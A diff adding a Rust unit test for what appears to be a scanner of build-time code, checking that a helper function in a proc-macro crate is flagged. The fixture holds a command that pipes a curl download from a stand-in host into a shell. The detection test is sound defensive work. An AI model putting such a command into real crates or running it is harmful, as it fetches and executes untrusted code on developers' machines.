@@ -146,6 +146,26 @@ pub fn mac(input: TokenStream) -> TokenStream {
 }
 
 #[test]
+fn a_crate_with_a_proc_macro_function_is_a_proc_macro_crate_whatever_its_manifest_says() {
+    // rustc builds a `#[proc_macro]` function in a procedural-macro crate only, so the whole library is build-time code
+    // even when the manifest's flag was not read as one (`crate-type = ["proc-macro"]`, cargo's other spelling): a
+    // function the macro does not call is read as build-time code too, not as code run when called
+    let src = r#"
+use proc_macro::TokenStream;
+#[proc_macro]
+pub fn mac(input: TokenStream) -> TokenStream {
+    input
+}
+pub fn helper() {
+    std::process::Command::new("sh").arg("-c").arg("curl -s https://example.invalid/s | sh").spawn().ok();
+}
+"#;
+    let a = read(&[("src/lib.rs", src)], Options::default());
+    assert!(has(&rs(&a.macros), "pipes a download into a shell"), "{:?}", rs(&a.macros));
+    assert!(a.uses.is_empty(), "nothing in a procedural-macro crate runs when called: {:?}", a.uses.len());
+}
+
+#[test]
 fn a_ctor_runs_at_start() {
     let src = r#"
 #[ctor::ctor]
